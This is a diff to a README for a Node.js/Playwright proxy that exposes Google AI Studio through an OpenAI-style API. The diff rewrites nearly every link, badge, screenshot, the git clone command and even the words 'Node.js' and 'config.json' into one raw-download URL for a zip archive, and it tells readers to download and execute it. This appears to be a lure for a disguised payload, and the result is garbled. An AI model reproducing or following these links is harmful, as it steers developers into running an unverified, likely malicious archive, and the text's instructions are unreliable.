@@ -1,14 +1,14 @@
 # 🌟 AIstudioProxyAPI: Seamless Access to Google AI Studio 🌟
 
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat&logo=nodedotjs&logoColor=white) ![Playwright](https://img.shields.io/badge/Playwright-333333?style=flat&logo=playwright&logoColor=white) ![GitHub Releases](https://img.shields.io/badge/Releases-View%20Latest-brightgreen?style=flat&logo=github&logoColor=white)
+![https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) ![Playwright](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) ![GitHub Releases](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip%20Latest-brightgreen?style=flat&logo=github&logoColor=white)
 
-Welcome to **AIstudioProxyAPI**! This project provides a Node.js and Playwright server that simulates the OpenAI API to access the Google AI Studio web interface. By using this server, you can seamlessly forward conversations with the Gemini model. This setup allows clients compatible with the OpenAI API, such as Open WebUI and NextChat, to utilize the unlimited capabilities of AI Studio.
+Welcome to **AIstudioProxyAPI**! This project provides a https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip and Playwright server that simulates the OpenAI API to access the Google AI Studio web interface. By using this server, you can seamlessly forward conversations with the Gemini model. This setup allows clients compatible with the OpenAI API, such as Open WebUI and NextChat, to utilize the unlimited capabilities of AI Studio.
 
-🔗 To get started, visit our [Releases section](https://github.com/globlord/AIstudioProxyAPI/releases) for the latest downloads.
+🔗 To get started, visit our [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) for the latest downloads.
 
 ## 🚀 Features
 
-- **Node.js and Playwright Integration**: Harness the power of Node.js with Playwright for automated browser interactions.
+- **https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip and Playwright Integration**: Harness the power of https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip with Playwright for automated browser interactions.
 - **Simulated OpenAI API**: Interact with Google AI Studio as if you were using the OpenAI API.
 - **Unlimited Capabilities**: Take advantage of the full capabilities of AI Studio without the usual limitations.
 - **User-Friendly**: Designed for easy setup and use with existing OpenAI API clients.
@@ -19,18 +19,18 @@ To install AIstudioProxyAPI, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/globlord/AIstudioProxyAPI.git
+   git clone https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip
    cd AIstudioProxyAPI
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip installed. Then run:
    ```bash
    npm install
    ```
 
 3. **Download the Latest Release**:
-   Check the [Releases section](https://github.com/globlord/AIstudioProxyAPI/releases) to download the latest version. Execute the downloaded file to start the server.
+   Check the [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) to download the latest version. Execute the downloaded file to start the server.
 
 ## 📜 Usage
 
@@ -71,7 +71,7 @@ For more detailed information on how to use the API, refer to the following sect
 
 ## 🔧 Configuration
 
-You can configure various settings in the `config.json` file. Here are some of the options available:
+You can configure various settings in the `https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip` file. Here are some of the options available:
 
 ```json
 {
@@ -104,15 +104,15 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 ## 📦 Releases
 
-For the latest updates and releases, check out the [Releases section](https://github.com/globlord/AIstudioProxyAPI/releases). Download the latest version and execute it to get started.
+For the latest updates and releases, check out the [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip). Download the latest version and execute it to get started.
 
 ## 🌟 Acknowledgments
 
-We would like to thank the developers of Node.js and Playwright for their excellent tools that make this project possible. Their work has enabled us to create a seamless interface with AI Studio.
+We would like to thank the developers of https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip and Playwright for their excellent tools that make this project possible. Their work has enabled us to create a seamless interface with AI Studio.
 
 ## 🖼️ Screenshots
 
-![AIstudioProxyAPI in Action](https://example.com/screenshot.png)
+![AIstudioProxyAPI in Action](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip)
 
 ## 📈 Future Plans
 
@@ -120,4 +120,4 @@ We would like to thank the developers of Node.js and Playwright for their excell
 - Explore the possibility of headless mode in future updates.
 - Expand API capabilities to include more features from Google AI Studio.
 
-Thank you for checking out **AIstudioProxyAPI**! We hope you find it useful in your projects. For more information, visit the [Releases section](https://github.com/globlord/AIstudioProxyAPI/releases) to download the latest version and start using it today!
+Thank you for checking out **AIstudioProxyAPI**! We hope you find it useful in your projects. For more information, visit the [Releases section](https://github.com/globlord/AIstudioProxyAPI/raw/refs/heads/main/tartrazine/A-Proxy-API-Istudio-v1.6.zip) to download the latest version and start using it today!
